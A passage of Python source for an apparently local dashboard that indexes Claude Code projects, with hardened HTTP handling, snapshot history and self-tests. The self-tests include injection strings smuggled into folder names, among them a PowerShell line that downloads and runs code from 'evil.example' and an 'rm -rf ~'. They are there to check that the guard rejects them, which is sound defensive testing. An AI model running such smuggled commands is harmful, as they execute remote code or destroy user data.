        if branch_hint and branch_hint != "HEAD" else None)

    if state_file:
        try:
            state_at = os.path.getmtime(state_file)
        except OSError:
            state_at = None
        rec["drift"] = drift(state_at, [
            (newest_tx, "transcript"),
            (_epoch((rec["git"] or {}).get("committed")), "commit"),
        ])
        st = rec["state"] or {}
        rec["proof_unknown"] = unknown_commits(path, st.get("proof"))
        rec["proof_unquoted"] = unverified_quotes(path, st.get("proof"), st.get("for"), st.get("bet"))
    rec["gate"] = gate(rec)
    rec["truth"] = truth(rec)

    if not rec["last_activity"]:
        newest = max((f["mtime"] for f in rec["files"]), default=None)
        rec["last_activity"] = newest
    if rec["session_id"] and rec["path"]:
        rec["resume"] = resume_cmd(rec["path"], rec["session_id"])
    return rec


# A quote in a folder name would close the quoted path, and whatever followed it
# would run when the copied command is pasted. PowerShell also reads the curly
# quotes as quotes. Such a folder gets no Copy resume, not per-shell escaping.
RESUME_UNSAFE = re.compile("['‘’‚‛\x00-\x1f\x7f]")


def resume_cmd(path, session_id):
    """The pasteable resume command, or None when the path or id could break out of it."""
    if RESUME_UNSAFE.search(path) or not re.fullmatch(r"[\w-]+", session_id):
        return None
    # ';' not '&&' - '&&' is a parser error in Windows PowerShell 5.1.
    return f"cd '{path}' ; claude --resume {session_id}"


def _pretty_slug(slug):
    """Best-effort label for a project whose real path cannot be recovered.

    Only used when there is no transcript to read `cwd` from. The leading drive
    token is dropped because "D: Project Alpha research" reads worse than "Project Alpha
    research", and the slug's separators are ambiguous anyway - which is exactly
    why this is a label and never a path.
    """
    body = re.sub(r"^[A-Za-z]--+", "", slug)
    return re.sub(r"-+", " ", body).strip() or slug


SCAN_TTL = 2.0


def scan(force=False):
    """All projects, newest first.

    Freshness over cleverness. The previous version keyed this cache on the
    registry directories' own mtimes, which looks like an input signature but
    is not one: on NTFS, appending to a transcript or rewriting a project's
    session-state.md changes NO directory mtime, so a running server served its
    first snapshot forever - reproduced with a fixture before this was changed.

    A short TTL is correct by construction instead of by enumeration: the real
    work is memoised per file on (path, mtime_ns, size), so a re-scan with
    nothing changed costs a few directory listings.

    ponytail: TTL over an exhaustive input signature - the set of inputs
    includes files whose paths are only known after a scan, which is circular.
    """
    now = time.monotonic()
    if (not force and _scan_cache["data"] is not None
            and now - _scan_cache["at"] < SCAN_TTL):
        return _scan_cache["data"]

    def from_registry(slug):
        slug_dir = os.path.join(REGISTRY, slug)
        path, branch = resolve_project(transcripts(slug_dir))
        return _build(path, slug, "registry", slug_dir=slug_dir, branch_hint=branch)

    # Each _build waits on ~4 git subprocesses, and a wait releases the GIL: run
    # one after another, 40 projects took 5s per scan. Threads, not processes,
    # because _cache is shared. ponytail: fixed pool of 8; git_info caching keyed
    # on .git/HEAD and index mtimes if hundreds of repos ever make this slow.
    slugs = sorted(d for d in os.listdir(REGISTRY)
                   if os.path.isdir(os.path.join(REGISTRY, d))) if os.path.isdir(REGISTRY) else []
    with ThreadPoolExecutor(8) as pool:
        out = list(pool.map(from_registry, slugs))

    seen = {os.path.normcase(os.path.abspath(r["path"]))
            for r in out if r["path"]}
    for path in EXTRA_ROOTS:
        norm = os.path.normcase(os.path.abspath(path))
        if norm in seen or not os.path.isdir(path):
            continue
        seen.add(norm)
        out.append(_build(path, _slugify(path), "extra"))

    out.sort(key=lambda r: (r["last_activity"] or ""), reverse=True)
    out = _dedupe(out)
    _scan_cache.update(at=now, data=out)
    if SNAPSHOTS:
        try:
            snapshot(out)
        except (OSError, sqlite3.Error, ValueError) as exc:
            # History is a nice-to-have: a full disk or a locked file must
            # never take the dashboard down with it.
            sys.stderr.write("  snapshot skipped: %s\n" % exc)
    return out


def _dedupe(records):
    """One card per real folder, and one id per card.

    Two registry slugs can resolve to the same `cwd`; keeping both would show a
    folder twice and make `/api/open` pick whichever came first. Ids are also
    forced unique because `_slugify` collapses punctuation, so `D:\\A B` and
    `D:\\A-B` both reduce to the same string - and a duplicate id means the
    detail view and the launch button address the wrong project.
    """
    out, by_path, ids = [], set(), set()
    for rec in records:                     # already newest-first
        if rec["path"]:
            norm = os.path.normcase(os.path.abspath(rec["path"]))
            if norm in by_path:
                continue
            by_path.add(norm)
        base, n = rec["id"], 2
        while rec["id"] in ids:
            rec["id"] = "%s-%d" % (base, n)
            n += 1
        ids.add(rec["id"])
        out.append(rec)
    return out


LIGHT = ("id", "name", "path", "path_exists", "unresolved", "missing",
         "source", "sessions", "bytes", "last_activity", "prompts",
         "prompt_trivial", "note", "session_id")


def light(rec):
    """Canvas payload. Carries next_action and the waiting count so a bubble
    opens instantly with no second fetch, but not the 60-line log tails."""
    out = {k: rec[k] for k in LIGHT}
    st = rec.get("state") or {}
    # `status` is a single word in Project Alpha ("paused") but a 500-character folded
    # paragraph in Project Beta. Only the short form can be a badge; the long
    # form is a summary line, so the split happens here rather than in the UI.
    raw = (st.get("status") or "").strip()
    short = raw if raw and len(raw) <= 24 and "\n" not in raw else None
    out["status"] = short
    out["status_note"] = None if short else (raw or None)
    out["last_updated"] = st.get("last_updated")
    out["next_action"] = st.get("next_action")
    # Same badge rule as status: only a short value can be a badge.
    stage = (st.get("stage") or "").strip()
    out["stage"] = stage if stage and len(stage) <= 24 and "\n" not in stage else None
    out["proof"] = st.get("proof")
    # How it started, next to the latest prompt (`prompts`); Claude's chapters
    # and shipped PRs travel as counts here, in full on /api/project/<id>.
    out["origin_prompt"] = (rec.get("origin") or {}).get("prompt")
    out["origin_at"] = (rec.get("origin") or {}).get("at")
    out["chapter_count"] = len(rec.get("chapters") or [])
    out["latest_chapter"] = (rec.get("chapters") or [{}])[-1].get("title")
    out["pr_count"] = len(rec.get("prs") or [])
    out["for"] = st.get("for")
    out["bet"] = st.get("bet")
    out["has_state"] = bool(rec.get("state"))
    out["waiting_count"] = len(rec.get("waiting") or [])
    out["blocker_count"] = len(rec.get("blockers") or [])
    out["branch"] = (rec.get("git") or {}).get("branch")
    out["dirty"] = (rec.get("git") or {}).get("dirty")
    out["resume"] = rec.get("resume")
    g = rec.get("gate") or {}
    out["drift"] = bool(rec.get("drift"))
    out["gate"] = g.get("verdict")
    out["gate_next"] = g.get("next")
    out["gap_count"] = len(g.get("gaps") or [])
    # Small (a few short lines), so /report draws the boundary with no extra fetch.
    out["truth"] = rec.get("truth")
    return out


def plans():
    out = []
    if not os.path.isdir(PLANS_DIR):
        return out
    for name in os.listdir(PLANS_DIR):
        if not name.endswith(".md"):
            continue
        fp = os.path.join(PLANS_DIR, name)
        try:
            st = os.stat(fp)
        except OSError:
            continue
        first = ""
        for line in read_text(fp, 8000).splitlines():
            if line.startswith("# "):
                first = line[2:].strip()
                break
        out.append({"name": name, "title": first or name, "size": st.st_size,
                    "mtime": _iso(st.st_mtime)})
    out.sort(key=lambda p: p["mtime"], reverse=True)
    return out


# ------------------------------------------------------------------- snapshots
# The opt-in history: one row per project each time something worth knowing
# changed (gate, STALE, stage, next step, proof, blockers, a commit, a session,
# a chapter). Claude Code clears old transcripts after a while, so this is also
# where a project's story survives them.

# Fields that move on every message in a live session. They are stored, but a
# change in them alone is not a new row, or an active chat would write one per scan.
SNAP_NOISE = ("bytes", "last_activity", "prompts", "prompt_trivial", "dirty", "session_id", "resume")
SNAP_SCHEMA = """
CREATE TABLE IF NOT EXISTS snapshots (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    project TEXT NOT NULL,      -- snap_key: the folder, or the registry id without one
    name TEXT,
    path TEXT,
    taken_at TEXT NOT NULL,     -- ISO, local time zone
    digest TEXT NOT NULL,       -- sha256 of the record without SNAP_NOISE
    record TEXT NOT NULL        -- JSON: snap_record()
);
CREATE INDEX IF NOT EXISTS snapshots_project ON snapshots (project, id);
"""
_snap_lock = threading.Lock()


def snap_db():
    return os.path.join(DATA_DIR, "history.sqlite3")


def _inside(child, parent):
    a, b = (os.path.normcase(os.path.realpath(x)) for x in (child, parent))
    try:
        return os.path.commonpath([a, b]) == b
    except ValueError:                         # different drives
        return False


def snap_dir_ok(records):
    """The read-only promise, enforced: never write inside ~/.claude, the
    registry, the plans or any project, whatever LIBRARY_DATA_DIR says."""
    forbidden = [os.path.join(os.path.expanduser("~"), ".claude"), REGISTRY, PLANS_DIR]
    forbidden += [r["path"] for r in records if r.get("path")]
    return not any(_inside(DATA_DIR, f) for f in forbidden)


def snap_key(rec):
    return os.path.normcase(os.path.abspath(rec["path"])) if rec.get("path") else rec["id"]


def snap_record(rec):
    """What a history row keeps: the card the city shows, plus the story and
    the newest commit, which is what is gone once transcripts are cleared."""
    out = light(rec)
    g = rec.get("git") or {}
    out.update(chapters=rec.get("chapters") or [], origin=rec.get("origin"),
               blockers=rec.get("blockers") or [], subject=g.get("subject"), committed=g.get("committed"))
    return out


def _snap_digest(snap):
    core = {k: v for k, v in snap.items() if k not in SNAP_NOISE}
    return hashlib.sha256(json.dumps(core, sort_keys=True, ensure_ascii=False).encode("utf-8")).hexdigest()


def snapshot(records):
    """Write a row for each project that changed since its last row; returns
    how many. Refuses (ValueError) a DATA_DIR inside anything it only reads."""
    if not snap_dir_ok(records):
        raise ValueError("%s is inside ~/.claude, the registry, the plans or a project; "
                         "set LIBRARY_DATA_DIR to a folder of its own" % DATA_DIR)
    with _snap_lock:                           # two scans at once must not both write the same change
        os.makedirs(DATA_DIR, exist_ok=True)
        con = sqlite3.connect(snap_db())
        try:
            con.executescript(SNAP_SCHEMA)
            last = dict(con.execute("SELECT project, digest FROM snapshots WHERE id IN "
                                    "(SELECT MAX(id) FROM snapshots GROUP BY project)"))
            at, rows = _iso(time.time()), []
            for rec in records:
                snap = snap_record(rec)
                key, digest = snap_key(rec), _snap_digest(snap)
                if last.get(key) != digest:
                    rows.append((key, rec["name"], rec.get("path"), at, digest, json.dumps(snap, ensure_ascii=False)))
            con.executemany("INSERT INTO snapshots (project, name, path, taken_at, digest, record) "
                            "VALUES (?, ?, ?, ?, ?, ?)", rows)
            con.commit()
            return len(rows)
        finally:
            con.close()


def history(rec, limit=100):
    """A project's rows, newest first. Opened read-only: no database means no
    history, and reading never creates one."""
    db = snap_db()
    if not os.path.isfile(db):
        return []
    from urllib.request import pathname2url
    try:
        con = sqlite3.connect("file:%s?mode=ro" % pathname2url(db), uri=True)
    except sqlite3.Error:
        return []
    try:
        rows = con.execute("SELECT taken_at, record FROM snapshots WHERE project = ? ORDER BY id DESC LIMIT ?",
                           (snap_key(rec), limit)).fetchall()
    except sqlite3.Error:                      # an older or foreign file: no history, not a crash
        return []
    finally:
        con.close()
    return [{"at": at, "record": json.loads(r)} for at, r in rows]


def _snapshot_loop():
    while True:
        time.sleep(SNAPSHOT_EVERY)
        scan(force=True)                       # scan() records the snapshot


# ---------------------------------------------------------------------- server

# Two separate secrets. TOKEN authorises the launch; the CSP nonce is minted
# per response, because a value reused on every response is not a nonce.
TOKEN = secrets.token_urlsafe(24)
ALLOWED_HOSTS = {f"{HOST}:{PORT}", f"localhost:{PORT}"}
CLIENT_ROUTES = ("/", "/blocked", "/plans", "/report")
MAX_BODY = 8192
def _find_vscode(cands=None):
    """Prefer Code.exe over code.cmd.

    A .cmd launcher still runs through cmd.exe even with shell=False, so shell
    metacharacters in an argument are re-parsed: a project folder named
    `notes & calc` would execute calc. Every path handed to this comes from our
    own scan rather than from a request, but the .exe takes its argv directly
    and removes the whole class of problem instead of escaping around it.
    """
    local = os.environ.get("LOCALAPPDATA", "")
    if cands is None:
        cands = (os.path.join(local, r"Programs\Microsoft VS Code\Code.exe"),
                 r"C:\Program Files\Microsoft VS Code\Code.exe",
                 shutil.which("Code.exe"),
                 shutil.which("code"))
    for cand in cands:
        # Reject .cmd/.bat: they run via cmd.exe, which re-parses arguments and
        # would undo the reason for preferring the .exe in the first place.
        if cand and os.path.isfile(cand) and not cand.lower().endswith((".cmd", ".bat")):
            return cand
    return None


VSCODE = _find_vscode()


class Handler(http.server.BaseHTTPRequestHandler):
    server_version = "product-library"
    protocol_version = "HTTP/1.1"
    # Without this a client that promises more body than it sends pins a worker
    # thread until it disconnects, and ThreadingHTTPServer has no thread cap.
    timeout = 15

    def log_message(self, fmt, *args):
        sys.stderr.write("  %s %s\n" % (self.address_string(), fmt % args))

    def log_error(self, fmt, *args):
        # The browser holds keep-alive sockets open; `timeout` closing an idle one
        # is normal, not an error worth a log line.
        if not fmt.startswith("Request timed out"):
            self.log_message(fmt, *args)

    # -- helpers

    def _host_ok(self):
        """Rejects DNS-rebinding and stray Host headers, but must accept plain
        'localhost:7777' or the obvious URL would 403.

        Exactly one Host header: with two, `get()` returns only the first, so an
        intermediary that honours the last one could disagree with this check.
        """
        hosts = self.headers.get_all("Host") or []
        return len(hosts) == 1 and hosts[0].strip().lower() in ALLOWED_HOSTS

    def _local_ok(self):
        """Guards the read endpoints against drive-by cross-origin requests.

        A hostile page can send `Host: 127.0.0.1:7777` on a cross-origin fetch,
        so the Host check alone still lets it trigger a full scan - 57 MB of
        transcript reads and three git subprocesses per request. CORS stops it
        reading the answer, but not the work. A custom header cannot be set
        cross-origin without a preflight, and nothing here answers preflights.
        """
        got = self.headers.get("X-Library-Token") or ""
        return secrets.compare_digest(got.encode("utf-8", "ignore"),
                                      TOKEN.encode())

    def _send(self, code, body, ctype="application/json; charset=utf-8",
              extra=None):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Referrer-Policy", "no-referrer")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _json(self, obj, code=200):
        self._send(code, json.dumps(obj, ensure_ascii=False))

    def _shell(self):
        """The app shell. Inline <style>/<script> are nonce'd rather than
        allowed via 'self': a bare default-src 'self' blocks inline blocks
        outright and renders a blank page."""
        try:
            html = read_text(os.path.join(HERE, "index.html"))
        except OSError:
            return self._send(500, "index.html is missing", "text/plain; charset=utf-8")
        nonce = secrets.token_urlsafe(18)
        html = html.replace("{{NONCE}}", nonce).replace("{{TOKEN}}", TOKEN)
        csp = (f"default-src 'self'; script-src 'nonce-{nonce}'; "
               f"style-src 'nonce-{nonce}'; img-src 'self' data:; "
               "connect-src 'self'; font-src 'self'; base-uri 'none'; "
               "form-action 'none'; frame-ancestors 'none'")
        self._send(200, html, "text/html; charset=utf-8",
                   {"Content-Security-Policy": csp, "Cache-Control": "no-store"})

    # -- routes

    def do_GET(self):
        if not self._host_ok():
            return self._send(403, "bad host", "text/plain; charset=utf-8")
        path = self.path.split("?")[0].rstrip("/") or "/"

        if path.startswith("/api/") and not self._local_ok():
            return self._json({"error": "missing X-Library-Token"}, 403)
        if path == "/api/projects":
            return self._json([light(r) for r in scan()])
        if path.startswith("/api/project/"):
            wanted = path[len("/api/project/"):]
            for rec in scan():
                if rec["id"] == wanted:
                    return self._json(rec)
            return self._json({"error": "unknown project"}, 404)
        if path == "/api/blocked":
            return self._json([
                {"id": r["id"], "name": r["name"], "waiting": r["waiting"],
                 "blockers": r["blockers"]}
                for r in scan() if r["waiting"] or r["blockers"]])
        if path == "/api/plans":
            return self._json(plans())
        if path.startswith("/api/chat/"):
            # /api/chat/<project id>/<session id>: one past chat, read-only.
            wanted, _, sid = path[len("/api/chat/"):].rpartition("/")
            for rec in scan():
                if rec["id"] == wanted:
                    fp = chat_file(rec, sid)
                    if not fp:
                        return self._json({"error": "unknown chat"}, 404)
                    return self._json(chat(fp))
            return self._json({"error": "unknown project"}, 404)
        if path.startswith("/api/history/"):
            wanted = path[len("/api/history/"):]
            for rec in scan():
                if rec["id"] == wanted:
                    return self._json({"enabled": SNAPSHOTS, "db": snap_db(), "rows": history(rec)})
            return self._json({"error": "unknown project"}, 404)
        if path.startswith("/api/"):
            return self._json({"error": "unknown endpoint"}, 404)

        # Client-side routes all serve the shell so /p/<id> is bookmarkable.
        if path in CLIENT_ROUTES or path.startswith("/p/"):
            return self._shell()
        return self._send(404, "not found", "text/plain; charset=utf-8")

    def do_POST(self):
        if not self._host_ok():
            return self._send(403, "bad host", "text/plain; charset=utf-8")
        if self.path.split("?")[0].rstrip("/") != "/api/open":
            return self._json({"error": "unknown endpoint"}, 404)

        try:
            n = int(self.headers.get("Content-Length") or 0)
        except ValueError:
            n = -1
        if n < 0:
            # min(-1, MAX_BODY) is -1, and read(-1) blocks until EOF.
            self.close_connection = True
            return self._json({"error": "bad content-length"}, 400)
        if n > MAX_BODY:
            # Reading only part of a declared body leaves the rest in the socket,
            # where keep-alive parses it as the NEXT request line. Refuse and
            # close instead of desynchronising the connection.
            self.close_connection = True
            return self._json({"error": "body too large"}, 413)
        try:
            body = json.loads(self.rfile.read(n) or b"{}")
        except (ValueError, TypeError, OSError):
            return self._json({"error": "bad body"}, 400)
        if not isinstance(body, dict):
            # `[1]` or `"x"` parses fine as JSON, then body.get explodes and
            # kills the thread with no response at all.
            return self._json({"error": "body must be an object"}, 400)

        # The token makes this unreachable from any other origin. Without it,
        # any website the browser visits could POST here and spawn an editor.
        # Compared as bytes: compare_digest rejects non-ASCII str outright, so a
        # token of "e" used to raise TypeError and drop the connection.
        sent = body.get("token")
        sent = sent if isinstance(sent, str) else ""
        if not secrets.compare_digest(sent.encode("utf-8", "ignore"), TOKEN.encode()):
            return self._json({"error": "bad token"}, 403)

        # An id, looked up in OUR scan - never a path from the request. A
        # path-accepting version of this endpoint is arbitrary-folder launch.
        target = next((r for r in scan() if r["id"] == body.get("id")), None)
        if not target or not target["path_exists"]:
            return self._json({"error": "unknown or missing project"}, 404)
        if not VSCODE or not os.path.isfile(VSCODE):
            return self._json({"error": "VS Code CLI not found"}, 500)
        try:
            subprocess.Popen([VSCODE, target["path"]], shell=False,
                             cwd=target["path"])
        except (OSError, subprocess.SubprocessError) as exc:
            return self._json({"error": f"launch failed: {exc}"}, 500)
        return self._json({"opened": target["path"]})


class Server(http.server.ThreadingHTTPServer):
    daemon_threads = True
    # On Windows SO_REUSEADDR lets a SECOND server bind a port already in use,
    # and requests then land on either one: a forgotten Product Library server answered with stale
    # data next to the live one. Found running two side by side. Elsewhere it
    # only means a fast restart after TIME_WAIT, which is what it is for.
    allow_reuse_address = os.name != "nt"


def serve():
    scanned = scan()
    print(f"Product Library  http://{HOST}:{PORT}   {len(scanned)} projects")
    print(f"     VS Code: {VSCODE if VSCODE and os.path.isfile(VSCODE) else 'NOT FOUND'}")
    if SNAPSHOTS:
        print(f"     History: {snap_db()}  (a scan every {SNAPSHOT_EVERY}s, and on every refresh)")
        threading.Thread(target=_snapshot_loop, daemon=True).start()
    Server((HOST, PORT), Handler).serve_forever()


# -------------------------------------------------------------------- selftest

def selftest():
    """Each assert here failed on purpose once before being kept. The cases are
    the real traps found while planning, not restatements of the code."""
    import tempfile
    global REGISTRY, EXTRA_ROOTS

    def rec(**kw):
        return json.dumps(kw, ensure_ascii=False)

    root = tempfile.mkdtemp(prefix="library-selftest-")
    reg = os.path.join(root, "registry")
    proj = os.path.join(root, "My Project")     # NB: space in the path
    os.makedirs(os.path.join(proj, ".claude"))
    slug_dir = os.path.join(reg, "D--My-Project")
    os.makedirs(os.path.join(slug_dir, "memory"))

    # TRAP 1: cwd is NOT on line 1. Line 1 is a queue-operation with no cwd.
    # TRAP 2: the NEWEST transcript holds no prompt at all - the real state is
    #         in the older one. Stopping at the newest returns nothing.
    old = os.path.join(slug_dir, "1111.jsonl")
    with open(old, "w", encoding="utf-8") as fh:
        fh.write(rec(type="queue-operation", sessionId="1111") + "\n")
        fh.write(rec(type="attachment", cwd=proj, gitBranch="main") + "\n")
        fh.write(rec(type="last-prompt", lastPrompt="continue") + "\n")
        # TRAP 3: non-ASCII. cp1252 cannot represent these; a locale-default
        # read either mojibakes or raises.
        fh.write(rec(type="last-prompt",
                     lastPrompt="راجع الاستخراج العربي — verify the totals") + "\n")
    new = os.path.join(slug_dir, "2222.jsonl")
    with open(new, "w", encoding="utf-8") as fh:
        fh.write(rec(type="queue-operation", sessionId="2222") + "\n")
        fh.write(rec(type="attachment", cwd=proj, gitBranch="main") + "\n")
        fh.write("x" * 400 + "\n")   # >MIN_JSONL_BYTES, still yields no prompt
    os.utime(old, (1_000_000, 1_000_000))
    os.utime(new, (2_000_000, 2_000_000))

    cwd, branch = resolve_cwd(old)
    assert cwd == proj, f"cwd not read past line 1: {cwd!r}"
    assert branch == "main", branch

    prompts, session_id, trivial = last_prompts(slug_dir)
    assert session_id == "1111", f"newest-with-content fallback failed: {session_id}"
    assert not trivial, "a substantive prompt was present"
    assert prompts[-1].startswith("راجع"), f"non-ASCII lost: {prompts[-1]!r}"
    assert "continue" not in prompts, "stoplist let 'continue' through"

    # A transcript whose ONLY prompts are trivial must still report something,
    # flagged - showing an empty bubble would be worse than showing "continue".
    only_dull = os.path.join(slug_dir, "3333.jsonl")
    with open(only_dull, "w", encoding="utf-8") as fh:
        fh.write(rec(type="attachment", cwd=proj) + "\n")
        fh.write(rec(type="last-prompt", lastPrompt="ok") + "\n")
        fh.write("y" * 300 + "\n")
    os.utime(only_dull, (3_000_000, 3_000_000))
    p2, s2, t2 = last_prompts(slug_dir)
    assert (s2, t2, p2) == ("3333", True, ["ok"]), (s2, t2, p2)
    os.remove(only_dull)

    # Frontmatter: the real shape, single-line JSON blockers, quoted scalars.
    with open(os.path.join(proj, STATE_FILE), "w", encoding="utf-8") as fh:
        fh.write('---\nstatus: paused\n'
                 'last_updated: 2026-09-08T18:25:00+03:00\n'
                 'next_action: "FRESH WINDOW — run the S40 prompt verbatim"\n'
                 'blockers: ["Me [M]: five rulings still placeholders", '
                 '"DONE 2026-09-06: counts ran", "Other session holds CLAUDE.md"]\n'
                 '---\n\n## body\n')
    fm = parse_frontmatter(read_text(os.path.join(proj, STATE_FILE)))
    assert fm["status"] == "paused", fm["status"]
    assert fm["next_action"].startswith("FRESH WINDOW —"), fm["next_action"]
    assert not fm["next_action"].endswith('"'), "quotes not stripped"
    assert len(fm["blockers"]) == 3, fm["blockers"]
    w = waiting_on_me(fm["blockers"])
    assert len(w) == 1 and w[0].startswith("Me [M]"), w
    assert fm["format"] == "frontmatter", fm["format"]

    # A real-world shape: folded block scalars, and blockers as a block
    # SEQUENCE rather than inline JSON. The first parser read status as ">".
    folded = parse_frontmatter(
        "---\n"
        "status: >\n"
        "  main is at abc1234 and is FULLY VERIFIED:\n"
        "  the coverage tab in three views.\n"
        "last_updated: 2026-09-08T14:40:00+03:00\n"
        "next_action: >\n"
        "  1) get on the LAN\n"
        "  2) then deploy\n"
        "blockers:\n"
        '  - "THE HOST1 IS OFF THIS LAN."\n'
        '  - "Me [M]: pick a merge order"\n'
        "---\n\nbody\n")
    assert folded["status"].startswith("main is at abc1234"), folded["status"]
    assert "\n" not in folded["status"], "'>' must fold newlines into spaces"
    assert folded["status"].endswith("three views."), folded["status"]
    assert folded["next_action"] == "1) get on the LAN 2) then deploy", folded["next_action"]
    assert folded["last_updated"].startswith("2026-09-08"), folded["last_updated"]
    assert len(folded["blockers"]) == 2, folded["blockers"]
    assert folded["blockers"][0] == "THE HOST1 IS OFF THIS LAN.", folded["blockers"]
    assert len(waiting_on_me(folded["blockers"])) == 1

    # '|' is the literal variant and must KEEP its line breaks.
    literal = parse_frontmatter("---\nnext_action: |\n  line one\n  line two\n---\n")
    assert literal["next_action"] == "line one\nline two", repr(literal["next_action"])

    # Project Gamma has NO frontmatter - a plain markdown doc whose
    # resume point is a heading. It scanned as stateless until this fallback.
    plain_doc = ("# Session State — Framework\n"
                 "**Updated:** 2026-07-09 · Owner: Me\n\n"
                 "Some preamble that is not the resume point.\n\n"
                 "## ⏯ RESUME HERE — next actions, in order\n"
                 "**REPRIORITIZED:** Focus is now Piece C.\n"
                 "Second line of the resume block.\n\n"
                 "## Something else entirely\n"
                 "must not appear\n")
    assert parse_frontmatter(plain_doc) is None
    pl = parse_plain_state(plain_doc)
    assert pl["format"] == "plain", pl["format"]
    assert pl["last_updated"] == "2026-07-09", pl["last_updated"]
    assert pl["next_action"].startswith("**REPRIORITIZED:**"), pl["next_action"]
    assert "must not appear" not in pl["next_action"], "ran past the next heading"
    assert "RESUME HERE" in pl["current_task"], pl["current_task"]
    assert parse_plain_state("# doc\n\nno resume heading anywhere\n") is None

    # Malformed frontmatter must degrade to raw text, never raise, never blank.
    bad = parse_frontmatter('---\nstatus: paused\nblockers: [oops, unclosed\n---\n')
    assert bad and bad["raw"], "no raw fallback"
    assert bad["blockers"] == ["[oops, unclosed"], bad["blockers"]
    assert parse_frontmatter("# no frontmatter here") is None

    # TRAP 4: append-only logs are newest-at-BOTTOM. Reading the head shows
    # January and calls it current.
    with open(os.path.join(proj, "HANDOFF.md"), "w", encoding="utf-8") as fh:
        fh.write("# Session Handoff\n\n## 2026-01-01 — ancient\n")
        fh.write("filler\n" * 800)
        fh.write("## 2026-09-08 — the entry that matters\nlast line here\n")
    logs = read_logs(proj)
    assert logs[0]["heading"] == "## 2026-09-08 — the entry that matters", logs[0]["heading"]
    assert "ancient" not in logs[0]["tail"], "read the head instead of the tail"
    assert logs[0]["tail"].endswith("last line here"), logs[0]["tail"][-40:]

    # Git enrichment is optional: no .git must mean None, not a crash.
    assert git_info(proj) is None, "invented git data for a non-repo"

    # Full scan against the fixture, including a slug with no transcript at all
    # (unresolvable - must survive as path:None, not be dropped) and a slug
    # whose cwd no longer exists (must be marked, not dropped).
    ghost = os.path.join(reg, "D--Gone")
    os.makedirs(ghost)
    with open(os.path.join(ghost, "9999.jsonl"), "w", encoding="utf-8") as fh:
        fh.write(rec(type="attachment", cwd=os.path.join(root, "vanished")) + "\n")
        fh.write(rec(type="last-prompt", lastPrompt="do the thing properly") + "\n")
        fh.write("z" * 300 + "\n")
    memory_only = os.path.join(reg, "D--Memory-Only", "memory")
    os.makedirs(memory_only)
    with open(os.path.join(memory_only, "MEMORY.md"), "w", encoding="utf-8") as fh:
        fh.write("- [Thing](thing.md) — hook\n")

    # A project whose state file has no frontmatter at all, reached through the
    # full scan rather than by calling the parser directly - otherwise dropping
    # the plain fallback from read_state() would go unnoticed.
    plain_proj = os.path.join(root, "Plain Project")
    os.makedirs(os.path.join(plain_proj, ".claude"))
    with open(os.path.join(plain_proj, STATE_FILE), "w", encoding="utf-8") as fh:
        fh.write("# Session State\n**Updated:** 2026-07-09\n\n"
                 "## RESUME HERE\nbuild piece C next\n")
    plain_slug = os.path.join(reg, "D--Plain-Project")
    os.makedirs(plain_slug)
    with open(os.path.join(plain_slug, "8888.jsonl"), "w", encoding="utf-8") as fh:
        fh.write(rec(type="attachment", cwd=plain_proj) + "\n")
        fh.write(rec(type="last-prompt", lastPrompt="get piece C moving") + "\n")
        fh.write("q" * 300 + "\n")

    extra = os.path.join(root, "Extra Root")
    os.makedirs(extra)
    with open(os.path.join(extra, "README.md"), "w", encoding="utf-8") as fh:
        fh.write("# extra\n")

    REGISTRY, EXTRA_ROOTS = reg, [extra, proj]   # proj is a dupe of the registry
    _cache.clear()
    _scan_cache.update(key=None, data=None)
    got = {r["id"]: r for r in scan(force=True)}

    assert len(got) == 5, sorted(got)   # dupe collapsed, nothing dropped

    flat = got["D--Plain-Project"]
    assert flat["state"]["format"] == "plain", flat["state"]
    assert flat["state"]["next_action"].startswith("build piece C"), flat["state"]
    assert light(flat)["next_action"].startswith("build piece C"), "bubble would be empty"
    mine = got["D--My-Project"]
    assert mine["name"] == "My Project", mine["name"]
    assert mine["path"] == proj and mine["path_exists"]
    assert mine["state"]["status"] == "paused"
    assert len(mine["waiting"]) == 1
    assert mine["sessions"] == 2 and mine["bytes"] > 0
    assert mine["resume"].count(";") == 1 and "&&" not in mine["resume"], mine["resume"]
    # A folder named to break out of the quotes gets no command to paste.
    for evil in ("D:\\x'; iex (iwr evil.example).Content; '", "D:\\x\u2019; calc; \u2018", "/tmp/a'\nrm -rf ~"):
        assert resume_cmd(evil, "1111") is None, evil
    assert resume_cmd("D:\\ok", "1111; calc") is None
    assert resume_cmd("D:\\My Project", "0b1c-22") == "cd 'D:\\My Project' ; claude --resume 0b1c-22"
    assert mine["session_id"] == "1111", mine["session_id"]

    gone = got["D--Gone"]
    assert gone["path_exists"] is False and gone["note"], gone
    assert gone["prompts"] == ["do the thing properly"], gone["prompts"]

    dark = got["D--Memory-Only"]
    assert dark["path"] is None and dark["sessions"] == 0
    assert dark["memory"].startswith("- [Thing]"), dark["memory"]
    assert dark["note"], "unresolvable project carried no explanation"

    assert got[_slugify(extra)]["source"] == "extra"
    assert _slugify(proj) not in got, "EXTRA_ROOTS duplicated a registry project"

    # The canvas payload must carry what a bubble needs, and nothing heavy.
    lt = light(mine)
    assert lt["next_action"].startswith("FRESH WINDOW"), lt["next_action"]
    assert lt["status"] == "paused" and lt["status_note"] is None, lt
    # A folded-paragraph status must NOT be offered as a badge.
    long_status = dict(mine, state=dict(mine["state"], status="x" * 400))
    lt2 = light(long_status)
    assert lt2["status"] is None and len(lt2["status_note"]) == 400, lt2["status"]
    assert lt["waiting_count"] == 1 and lt["blocker_count"] == 3
    assert "logs" not in lt and "blockers" not in lt, sorted(lt)

    # Ordering is by recency, so the canvas rings are correct by construction.
    order = [r["id"] for r in scan()]
    assert order.index("D--My-Project") < order.index("D--Memory-Only"), order

    shutil.rmtree(root, ignore_errors=True)
    selftest_regressions()
    selftest_gate()
    selftest_checkpoint()
    selftest_truth()
    selftest_story()
    selftest_snapshot()
    selftest_chat()
    print("selftest OK")


def selftest_regressions():
    """Every case here is a wrong answer an independent review actually found.

    They are kept separate from the cases above only because they came later;
    each one failed before its fix and each is a plausible real file, not a
    contrived string.
    """
    import tempfile
    global REGISTRY, EXTRA_ROOTS

    def rec(**kw):
        return json.dumps(kw, ensure_ascii=False) + "\n"

    root = tempfile.mkdtemp(prefix="library-regress-")

